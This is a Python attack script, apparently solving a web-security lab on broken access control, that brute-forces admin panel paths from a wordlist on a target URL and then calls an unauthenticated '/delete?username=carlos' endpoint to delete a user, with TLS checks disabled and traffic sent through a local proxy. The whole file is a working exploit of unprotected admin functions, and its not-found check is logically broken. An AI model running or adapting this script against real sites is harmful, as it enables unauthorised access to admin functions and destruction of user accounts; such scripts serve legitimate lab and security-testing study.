import requests,argparse,urllib3
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.01:8080', 'https': 'http://127.0.0.1:8080'}

def banner():
    # generating randfonts
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # generating randcolors
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format('broken access control',font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    parser.add_argument('-list','--list',
                        dest='List',
                        help='List of admin panels',
                        default='list.txt',
                        required=False)
   
    return parser.parse_args()


def delet_user(url,admin_panel):
    r= get_method(url=url,admin_panel=admin_panel)
    if 'carlos' not in r.text:
        print(colored('we\'ve deleted the user carlos','green'))
    else:
        print(colored('we\'ve not deleted the user carlos','red'))

def get_method(url,admin_panel):
    try:
        r=requests.get(url=url+admin_panel,verify=False,proxies=proxies,timeout=1)
        return r
    except Exception as e:
        print(colored(e,'red'))

def find_admin_panel(url,list_of_admins_panel):
    with open(list_of_admins_panel,'r') as file:
        lines=file.readlines()
        for line in lines:
            line=str(line).rstrip('\n')
            r=get_method(url,line)
            if r.status_code==200:
                print(colored(f'Found admin panel in: {url+line}','green'))
                line=f'{line}/delete?username=carlos'
                delet_user(url=url,admin_panel=line)
                break
            elif len(line)==len(lines)-1:
                print(colored('Sorry we didn\'t find the admin panel try again using another list :(','red'))



if __name__=='__main__':
    banner()
    url=parsearg().url
    url=str(url).rstrip('/')
    list_of_admins_panel=parsearg().List

    print(colored('Trying to finde admin panel','blue'))
    find_admin_panel(url,list_of_admins_panel)

